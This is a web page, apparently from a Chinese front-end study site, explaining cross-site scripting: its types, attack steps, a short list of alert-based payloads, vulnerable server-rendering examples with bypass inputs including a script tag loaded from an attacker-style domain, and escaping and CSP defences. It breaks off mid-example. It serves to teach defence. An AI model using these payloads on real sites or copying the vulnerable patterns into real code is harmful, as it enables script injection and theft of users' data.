<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/569ce4b8f30dc480-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/93f479601ee12b01-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="stylesheet" href="/_next/static/css/ec0a9d078e716e00.css" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/485ff6fe79292a08.css" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/0ff121a467c0636f.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-038c2e688b596d0e.js"/><script src="/_next/static/chunks/4bd1b696-20882bf820444624.js" async=""></script><script src="/_next/static/chunks/517-98ed787e5f259f2c.js" async=""></script><script src="/_next/static/chunks/main-app-f33d3e3aed85e21f.js" async=""></script><meta name="next-size-adjust" content=""/><title>front-end</title><meta name="description" content="front-end knowledge"/><link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="16x16"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body class="__variable_4d318d __variable_ea5f4b antialiased"><main><div class="markdown-body"><h1>XSS 跨站脚本攻击</h1><article><h1>XSS 跨站脚本攻击</h1>
<p>XSS 攻击全称 <strong>跨站脚本攻击</strong>（Cross-Site Scripting），是一种代码注入攻击。</p>
<ul>
<li>攻击方法：攻击者利用网页开发时留下的漏洞，通过巧妙的方法在目标网站 HTML 页面中注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。</li>
<li>本质：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。</li>
</ul>
<h2>攻击种类</h2>
<p>根据攻击的来源，XSS 攻击可分为 <strong>反射型</strong>、<strong>存储型</strong> 和 <strong>DOM-Based 型</strong>三种。</p>
<table>
<thead>
<tr>
<th style="text-align:left">类型</th>
<th style="text-align:left">存储区</th>
<th style="text-align:left">插入点</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">反射型</td>
<td style="text-align:left">URL</td>
<td style="text-align:left">HTML</td>
</tr>
<tr>
<td style="text-align:left">存储型</td>
<td style="text-align:left">服务端数据库</td>
<td style="text-align:left">HTML</td>
</tr>
<tr>
<td style="text-align:left">DOM-Based 型</td>
<td style="text-align:left">服务端数据库 / 客户端存储 / URL</td>
<td style="text-align:left">前端 JavaScript</td>
</tr>
</tbody>
</table>
<p>名词说明：</p>
<ul>
<li><strong>存储区</strong>：恶意代码存放的位置</li>
<li><strong>插入点</strong>：由谁取得恶意代码，并插入到网页上</li>
</ul>
<h3>反射型</h3>
<p>反射型 XSS 攻击又称为<strong>非持久性跨站点脚本攻击</strong>，这种攻击类型通过诱导用户点击恶意链接来造成一次性攻击。</p>
<p><strong>攻击方式</strong>：漏洞产生的原因是攻击者 &lt;strong style=&quot;color:red&quot;&gt;注入的数据反映在请求响应&lt;/strong&gt; 中。用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户浏览器执行，从而达到攻击目的。通过 URL 参数直接注入，然后在响应的数据中包含着危险的代码。</p>
<p>攻击步骤：</p>
<ol>
<li>攻击者把带有恶意脚本代码参数的 URL 地址发送给用户</li>
<li>用户点击此链接</li>
<li>服务器端获取请求参数并且直接使用，服务器反射回结果页面</li>
</ol>
<p>说明：</p>
<ul>
<li>反射型 XSS 攻击是一次性的，必须要通过用户点击链接才能发起</li>
<li>一些浏览器如 Chrome 其内置了一些 XSS 过滤器，可以防止大部分反射型 XSS 攻击</li>
<li>反射型 XSS 其实就是服务器没有对恶意的用户输入进行安全处理就直接反射响应内容，导致恶意代码在浏览器中执行的一种 XSS 漏洞</li>
</ul>
<p>攻击示例：</p>
<pre class="hljs"><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;application/javascript&quot;</span>&gt;</span><span class="language-javascript">
  <span class="hljs-comment">// 假设这是请求返回的数据</span>
  <span class="hljs-keyword">const</span> res = [<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;&lt;img src=&quot;1&quot; onerror=&quot;console.log(windwo.localStorage)&quot; /&gt;&#x27;</span>];

  <span class="hljs-keyword">const</span> root = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#root&#x27;</span>);

  res.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> p = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;p&#x27;</span>);
    p.<span class="hljs-property">innerHTML</span> = item;
    root.<span class="hljs-title function_">append</span>(p);
  });
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>当数据返回后，<code>&lt;img&gt;</code> 标签会注入 HTML DOM 文档中，又因为 <code>src</code> 属性为无效的 URL 值，所以触发了 <code>onerror</code> 事件，从而执行了 <code>onerror</code> 定义的函数，这样便获取到了存储在客户端本地的 <code>localStorage</code> 信息。</p>
<blockquote>
<p>🤼‍♂️ <strong>反射型 XSS 跟存储型 XSS 的区别是？</strong></p>
<ul>
<li>反射型 XSS 漏洞常见于 &lt;strong style=&quot;color:red&quot;&gt;通过 URL 传递参数&lt;/strong&gt; 的功能，如网站搜索、跳转等。</li>
<li>存储型 XSS 的恶意代码 &lt;strong style=&quot;color:red&quot;&gt;存在数据库&lt;/strong&gt; 里，反射型 XSS 的恶意代码存在 URL 里。</li>
</ul>
<p>由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p>
</blockquote>
<p>POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。</p>
<h3>存储型</h3>
<p>存储型 XSS 攻击又称为<strong>持久性跨站点脚本攻击</strong>，通常攻击者将代码存储到漏洞服务器中，用户浏览相关页面发起攻击。</p>
<p>攻击步骤：</p>
<ol>
<li>攻击者将恶意脚本代码上传或存储到漏洞服务器</li>
<li>服务器把恶意脚本保存到服务器</li>
<li>当正常客户访问服务器时，服务器会读取恶意数据并且直接使用</li>
<li>服务器会返回含有恶意脚本的页面</li>
</ol>
<p>实际案例：</p>
<ul>
<li>譬如发帖中发出包含恶意代码的内容，其他内容访问到该内容后，满足特定条件后条件即触发</li>
<li>需要后台不过滤信息，并且前端展示时也不过滤信息</li>
</ul>
<p><strong>注意</strong>：这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p>
<p>修复：服务端一般不会轻易对大量已存数据再编辑。需要对新写入数据修正存储逻辑。前端做好正确的 <strong>编码转义</strong>。</p>
<table>
<thead>
<tr>
<th style="text-align:left">类型</th>
<th style="text-align:left">反射型</th>
<th style="text-align:left">存储型</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">持久性</td>
<td style="text-align:left">非持久</td>
<td style="text-align:left">持久化（存储在服务器）</td>
</tr>
<tr>
<td style="text-align:left">触发时机</td>
<td style="text-align:left">需要用户点击</td>
<td style="text-align:left">不需要用户交互也可以触发</td>
</tr>
<tr>
<td style="text-align:left">危害</td>
<td style="text-align:left">危害较小</td>
<td style="text-align:left">危害更大</td>
</tr>
</tbody>
</table>
<h3>DOM Based 型</h3>
<p>DOM Based 型 XSS，这种攻击类型不需要服务器端支持，是由于 DOM 结构修改导致的，基于浏览器 DOM 解析的攻击</p>
<p>攻击步骤：</p>
<ol>
<li>用户打开带有恶意的链接</li>
<li>浏览器在 DOM 解析的时候直接使用恶意数据</li>
<li>用户中招</li>
<li>常见的触发场景就是在修改 <code>innerHTML</code>、<code>outerHTML</code>、<code>document.write</code> 的时候</li>
</ol>
<p>实际案例：</p>
<ul>
<li>譬如 Wifi 浏览器劫持、DNS 劫持，并直接返回钓鱼页面</li>
<li>本质是需要更改 DOM，再排除自己攻击自己，所以这里单独拿流量劫持举例。严格来说某些反射型的攻击也能造成这个后果-通过 URL 控制 DOM。</li>
</ul>
<p>DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p>
<h2>攻击手段</h2>
<p>攻击手段：</p>
<ul>
<li>获取页面的数据，如 DOM、Cookie、LocalStorage</li>
<li>破坏页面结构</li>
<li>流量劫持</li>
<li>挂马</li>
<li>盗取用户 Cookie</li>
<li>DDOS（拒绝服务）客户端浏览器</li>
<li>钓鱼工具，高级的钓鱼技巧</li>
<li>删除用户文章、恶意篡改数据、嫁祸</li>
<li>劫持用户 Web 行为，甚至进一步渗透内网</li>
<li>爆发 Web2.0 蠕虫</li>
<li>蠕虫式 DDoS 攻击</li>
<li>蠕虫式挂马攻击、刷广告、刷流量、破坏网上数据</li>
</ul>
<p>常见有效荷载（Payload）：</p>
<ul>
<li><code>&lt;input onfocus=write('xss') autofocus&gt;</code></li>
<li><code>&lt;img src onerror=alert('xss')&gt;</code></li>
<li><code>&lt;svg onload=alert('xss') &gt;</code></li>
<li><code>&lt;script&gt;alert('xss')&lt;/script&gt;</code></li>
<li><code>&lt;a href=&quot;javascript:alert('xss')&quot;&gt;clickme&lt;/a&gt;</code></li>
</ul>
<blockquote>
<p>XSS 荷载（XSS Payload）是指恶意植入且具有完成各种具体功能的恶意脚本。</p>
</blockquote>
<h3>标签拼接漏洞</h3>
<p>服务端渲染代码：这里的 <code>input</code> 可能是客户端传递到服务端的数据</p>
<pre class="hljs"><code class="language-js"><span class="hljs-comment">// Server Code</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">serverRender</span>(<span class="hljs-params">input</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;div&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/div&#x27;</span>&gt;
}
</code></pre>
<p>攻击方法：破坏原来的 HTML 代码结构，让你写的代码生效</p>
<p>输入渲染的 <code>input</code> 变量为 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>输出渲染的 HTML 结构：<code>&lt;div&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/div&gt;</code></p>
<p>这样你脚本内的 <code>alert(1)</code> 函数返回到前端渲染时就会被自动执行。</p>
<h3>提前闭合标签</h3>
<p>对于 <code>&lt;textarea&gt;</code> 这种原生会转换输入数据为字符串的标签，可以输入提前闭合标签绕过：</p>
<p><code>&lt;/textarea&lt;script&gt;alert(1)&lt;/script&gt;&lt;textarea&gt;</code></p>
<p>或者 <code>input</code>标签：</p>
<pre class="hljs"><code class="language-js"><span class="hljs-comment">// Server Code</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">serverRender</span>(<span class="hljs-params">input</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;input type=&quot;name&quot; value=&#x27;</span> + input + <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>;
}
</code></pre>
<p>输入 <code>input</code> 变量：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>输出渲染的 HTML 结构：<code>&lt;input type=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(1)&quot;&gt;</code></p>
<h3>合法 HTML 转义漏洞</h3>
<p>服务端渲染代码：将用户输入代码通过合法的 HTML 标签转义输出，返回给前端渲染</p>
<pre class="hljs"><code class="language-js"><span class="hljs-comment">// Server Code</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">serverRender</span>(<span class="hljs-params">input</span>) {
  <span class="hljs-comment">// HTML 的字符转义</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeHtml</span>(<span class="hljs-params">s</span>) {
    <span class="hljs-keyword">return</span> s
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&amp;/g</span>, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&#x27;&amp;#39;&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">&#x27;&amp;rt;&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;&amp;#x2f&#x27;</span>);
  }

  <span class="hljs-keyword">const</span> domainReg = <span class="hljs-regexp">/^https?:\/\/www\.example\.com/</span>;

  <span class="hljs-keyword">if</span> (domainRe.<span class="hljs-title function_">test</span>(input)) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;script src=&quot;<span class="hljs-subst">${escapeHtml(input)}</span>&quot;&gt;&lt;/script&gt;`</span>;
  }

  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid URL&#x27;</span>;
}
</code></pre>
<p>攻击方法：创建多级域名，子孙级域名中带 <code>.com</code></p>
<pre class="hljs"><code class="language-js"><span class="hljs-comment">// 输入</span>
<span class="hljs-keyword">const</span> input = <span class="hljs-string">&#x27;https://www.example.com.xss.com/foo.js&#x27;</span>;
</code></pre>
<p>输出渲染的 HTML DOM 结构：那么这个输入的 URL 就会被执行了</p>
<pre class="hljs"><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http:&amp;#x2f&amp;#x2fwww.example.com.xss.com&amp;#x2ffoo.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>HTML 转码在 URL 和 JavaScript 中都是无效的。</p>
<h3>合法 JS 转义漏洞</h3>
<pre class="hljs"><code class="language-js"><span class="hljs-comment">// Server Code</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">serverRender</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-comment">// JavaScript 的字符转义</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeJs</span>(<span class="hljs-params">s</span>) {
    <span class="hljs-keyword">return</span> s
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\\/g</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&quot;\\&#x27;&quot;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;\\&quot;&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/`/g</span>, <span class="hljs-string">&#x27;\\`&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;\\74&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">&#x27;\\76&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;\\/&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\n/g</span>, <span class="hljs-string">&#x27;\\n&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\r/g</span>, <span class="hljs-string">&#x27;\\r&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\t/g</span>, <span class="hljs-string">&#x27;\\t&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\f/g</span>, <span class="hljs-string">&#x27;\\f&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\v/g</span>, <span class="hljs-string">&#x27;\\v&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\0/g</span>, <span class="hljs-string">&#x27;\\0&#x27;</span>);
  }

  <span class="hljs-keyword">const</span> s = <span class="hljs-title function_">escapeJs</span>(s);

  <span class="hljs-keyword">return</span> <span class="hljs-string">`
&lt;script type=&quot;application/javascript&quot;&gt;
  var url = &#x27;javascript:console.log(&quot;<span class="hljs-subst">${s}</span>&quot;)&#x27;
  var a = document.createElement(&#x27;a&#x27;)

  a.href = url
  document.body.appendChild(a)
  a.click()
&lt;/script&gt;
  `</span>;
}
</code></pre>
<p>输出的 HTML DOM 结构：</p>
<pre class="hljs"><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;application/javascript&quot;</span>&gt;</span><span class="language-javascript">
  <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;javascript:console.log(&quot;&quot;)&#x27;</span>;
  <span class="hljs-keyword">var</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;a&#x27;</span>);

  a.<span class="hljs-property">href</span> = url;
  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a);
  a.<span class="hljs-title function_">click</span>();
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3>方法总结</h3>
<ul>
<li>在 HTML 中内嵌的文本那种，恶意内容以 <code>script</code> 标签形成注入</li>
<li>在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串、变量、方法名等）</li>
<li>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签</li>
<li>在标签的 <code>href</code>、<code>src</code> 等属性中，包含 <code>javascript:</code> 等可执行代码</li>
<li>在 <code>onload</code>、<code>onerror</code>、<code>onclick</code> 等事件中，注入不受控制代码</li>
<li>在 <code>style</code> 属性和标签汇总，包含类似 <code>background-image: url(&quot;javascript:...&quot;)</code> 的代码（新版本浏览器已经可以防范）</li>
<li>在 <code>style</code> 属性和标签中，包含类似 <code>expression(...)</code> 的 CSS 表达式代码（新版本浏览器已经可以防范）</li>
</ul>
<h2>防御策略</h2>
<p>防护原则：</p>
<ul>
<li>未雨绸缪
<ul>
<li>HTML 正文：HTML 实体字符转义</li>
<li>HTML 标签：HTML 实体字符转义</li>
<li>HTML <code>onxxx</code> 事件属性：JS 转义</li>
<li>URL：URL 转义</li>
<li>用户富文本输入：后端白名单标签过滤，使用开源库（例如：<a href="https://www.npmjs.com/package/sanitize-html" target="_blank" rel="noopener noreferrer nofollow">sanitize-html</a>），不要用正则过滤</li>
</ul>
</li>
<li>配置安全协议头
<ul>
<li>Content-Security-Policy</li>
</ul>
</li>
</ul>
<h3>输入过滤</h3>
<p>在用户提交时，由前端过滤输入，然后提交到后端。这样做是否可行呢？</p>
<p>答案是不可行。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。</p>
<p>那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把 <strong>安全的</strong> 内容，返回给前端。这样是否可行呢？</p>
<p>我们举一个例子，一个正常的用户输入了 <code>5 &lt; 7</code> 这个内容，在写入数据库前，被转义，变成了 <code>5 &amp;lt; 7</code>。</p>
<p>问题是：在提交阶段，我们并不确定内容要输出到哪里。</p>
<p>这里的 <strong>并不确定内容要输出到哪里</strong> 有两层含义：</p>
<ul>
<li>用户的输入内容可能同时提供给 Web 前端和客户端，而一旦经过了 <code>escapeHTML()</code>，客户端显示的内容就变成了乱码 <code>5 &amp;lt; 7</code>。</li>
<li>在前端中，不同的位置所需的编码也不同。</li>
</ul>
<p>当 <code>5 &amp;lt; 7</code> 作为 HTML 拼接页面时，可以正常显示：</p>
<pre class="hljs"><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;comment&quot;</span>&gt;</span>5 <span class="hljs-symbol">&amp;lt;</span> 7<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>当 <code>5 &amp;lt; 7</code> 通过 AJAX 返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算。不能用于标题、<code>alert</code> 等。</p>
<p>所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。
当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。</p>
<p>输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。</p>
<h3>纯前端渲染</h3>
<p>预防攻击类型：<code>存储型 XSS</code> 和 <code>反射型 XSS</code>。</p>
<p>纯前端渲染的过程：</p>
<ol>
<li>浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。</li>
<li>然后浏览器执行 HTML 中的 JavaScript。</li>
<li>JavaScript 通过 AJAX 加载业务数据，调用 DOM API 更新到页面上。</li>
</ol>
<p>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本 <code>.innerText</code>，还是属性 <code>.setAttribute</code>，还是样式 <code>.style</code> 等等。如此，浏览器不会被轻易地被欺骗，执行预期外的代码。</p>
<p>但纯前端渲染还需注意避免 DOM 型 XSS 漏洞，例如 <code>onload</code> 事件和 <code>href</code> 中的 <code>javascript:xxx</code> 等。</p>
<p>在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。</p>
<h3>转义 HTML</h3>
<p>如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。
常用的模板引擎，如 <code>doT.js</code>、<code>ejs</code>、<code>FreeMarker</code> 等，对于 HTML 转义通常只有一个规则，就是把 <code>&amp; &lt; &gt; &quot; ' /</code> 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：</p>
<table>
<thead>
<tr>
<th style="text-align:left">XSS 安全漏洞</th>
<th style="text-align:left">简单转义是否有防护作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">HTML 标签文字内容</td>
<td style="text-align:left">有</td>
</tr>
<tr>
<td style="text-align:left">HTML 属性值</td>
<td style="text-align:left">有</td>
</tr>
<tr>
<td style="text-align:left">CSS 内联样式</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">内联 JavaScript</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">内联 JSON</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">跳转链接</td>
<td style="text-align:left">无</td>
</tr>
</tbody>
</table>
<p>所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。</p>
<p>例如 Java 工程里，常用的转义库 <code>org.owasp.encoder</code>。</p>
<pre class="hljs"><code class="language-html"><span class="hljs-comment">&lt;!-- HTML 标签内文字内容 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&lt;%= Encode.forHtml(UNTRUSTED) %&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-comment">&lt;!-- HTML 标签属性值 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&lt;%= Encode.forHtml(UNTRUSTED) %&gt;&quot;</span> /&gt;</span>

<span class="hljs-comment">&lt;!-- CSS 属性值 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:&lt;= Encode.forCssString(UNTRUSTED) %&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-comment">&lt;!-- CSS URL --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background:&lt;= Encode.forCssUrl(UNTRUSTED) %&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-comment">&lt;!-- JavaScript 内联代码块 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;application/javascript&quot;</span>&gt;</span><span class="language-javascript">
  <span class="hljs-keyword">var</span> msg = <span class="hljs-string">&#x27;&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;&#x27;</span>;
  <span class="hljs-title function_">alert</span>(msg);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-comment">&lt;!-- JavaScript 内联代码块内嵌 JSON --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;application/javascript&quot;</span>&gt;</span><span class="language-javascript">
  <span class="hljs-keyword">var</span> __INITIAL_STATE__ = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&lt;%= Encoder.forJavaScript(data.to_json) %&gt;&#x27;</span>);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-comment">&lt;!-- HTML 标签内联监听器 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;&#x27;);&quot;</span>&gt;</span>
  click me
<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>

<span class="hljs-comment">&lt;!-- URL 参数 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/search?value=&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&amp;order=1#top&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>

<span class="hljs-comment">&lt;!-- URL 路径 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/page/&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
<span class="hljs-comment">&lt;!--
  URL.
  注意：要根据项目情况进行过滤，禁止掉 &quot;javascript:&quot; 链接、非法 Scheme 等
--&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">a</span>
  <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;&lt;%=
    urlValidator.isValid(UNTRUSTED) ?
      Encode.forHtml(UNTRUSTED) :
    &quot;/404&quot;
  %&gt;&#x27;</span>
&gt;</span>
  link
<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
</code></pre>
<h3>禁止执行不可信数据</h3>
<p>DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。</p>
<p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等。</p>
<p>如果用 Vue / React 技术栈，并且不使用 <code>v-html</code> / <code>dangerouslySetInnerHTML</code> 功能，就在前端 <code>render</code> 渲染阶段避免 <code>innerHTML</code>、<code>outerHTML</code> 的 XSS 隐患。</p>
<p>以下方式都能把字符串作为代码运行：</p>
<ul>
<li>DOM 中的内联事件监听器：如 <code>location</code>、<code>onclick</code>、<code>onerror</code>、<code>onload</code>、<code>onmouseover</code> 等</li>
<li>HTML DOM 标签属性：<code>&lt;a&gt;</code> 标签的 <code>href</code> 属性</li>
<li>JavaScript 的 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code> 等</li>
</ul>
<p>如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p>
<pre class="hljs"><code class="language-html"><span class="hljs-comment">&lt;!-- 内联事件监听器中包含恶意代码 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;UNTRUSTED&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;UNTRUSTED&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:image/png,&quot;</span> /&gt;</span>

<span class="hljs-comment">&lt;!-- 链接内包含恶意代码 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;UNTRUSTED&quot;</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;application/javascript&quot;</span>&gt;</span><span class="language-javascript">
